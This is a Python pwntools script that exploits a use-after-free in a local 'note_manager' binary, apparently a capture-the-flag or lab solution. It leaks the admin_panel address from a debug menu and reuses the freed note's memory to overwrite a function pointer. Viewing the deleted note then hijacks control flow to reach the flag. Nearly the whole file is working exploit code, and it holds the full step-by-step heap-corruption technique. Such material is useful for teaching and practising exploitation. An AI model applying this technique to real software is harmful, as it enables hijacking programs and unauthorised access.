#!/usr/bin/env python3
"""
UAF Exploit for Note Manager

This script demonstrates exploitation of the Use-After-Free vulnerability.
It uses pwntools to interact with the binary and GDB for debugging.

Usage:
    python3 exploit.py          # Run exploit
    python3 exploit.py GDB      # Run with GDB attached
"""

import sys
from pwn import *

# Set context
context.binary = './note_manager'
context.log_level = 'info'

def create_note(p, index):
    p.sendlineafter(b'Choice: ', b'1')
    p.sendlineafter(b'Index', str(index).encode())

def edit_note(p, index, content):
    p.sendlineafter(b'Choice: ', b'2')
    p.sendlineafter(b'Index', str(index).encode())
    p.sendlineafter(b'Content: ', content)

def view_note(p, index):
    p.sendlineafter(b'Choice: ', b'3')
    p.sendlineafter(b'Index', str(index).encode())

def delete_note(p, index):
    p.sendlineafter(b'Choice: ', b'4')
    p.sendlineafter(b'Index', str(index).encode())

def alloc_buffer(p, size):
    p.sendlineafter(b'Choice: ', b'5')
    p.sendlineafter(b'Size: ', str(size).encode())

def write_buffer(p, data_hex):
    p.sendlineafter(b'Choice: ', b'6')
    p.sendlineafter(b'Data', data_hex)

def show_debug(p):
    p.sendlineafter(b'Choice: ', b'7')

def main():
    # Start process
    if len(sys.argv) > 1 and sys.argv[1] == 'GDB':
        p = gdb.debug('./note_manager', '''
            b admin_panel
            b view_note
            b delete_note
            c
        ''')
    else:
        p = process('./note_manager')

    # Get admin_panel address from debug output
    show_debug(p)
    p.recvuntil(b'admin_panel() @ ')
    admin_addr = int(p.recvline().strip(), 16)
    log.info(f"admin_panel @ {hex(admin_addr)}")

    # Note struct size: 64 (content) + 8 (function pointer) = 72 bytes
    NOTE_SIZE = 72
    HANDLER_OFFSET = 64

    # Step 1: Create a note
    log.info("Creating note at index 0")
    create_note(p, 0)

    # Step 2: Delete the note (creates dangling pointer)
    log.info("Deleting note (creating dangling pointer)")
    delete_note(p, 0)

    # Step 3: Allocate buffer of same size to reuse freed memory
    log.info(f"Allocating buffer of size {NOTE_SIZE} to reuse freed memory")
    alloc_buffer(p, NOTE_SIZE)

    # Step 4: Write admin_panel address at the handler offset
    # We need to fill 64 bytes of content, then overwrite the function pointer
    payload = b'A' * HANDLER_OFFSET  # Fill content area
    payload += p64(admin_addr)       # Overwrite on_view with admin_panel

    log.info(f"Writing payload to overwrite function pointer with {hex(admin_addr)}")
    write_buffer(p, payload.hex().encode())

    # Step 5: View the "deleted" note - triggers UAF
    log.info("Triggering UAF by viewing deleted note...")
    view_note(p, 0)

    # Should see the flag!
    p.interactive()

if __name__ == '__main__':
    main()
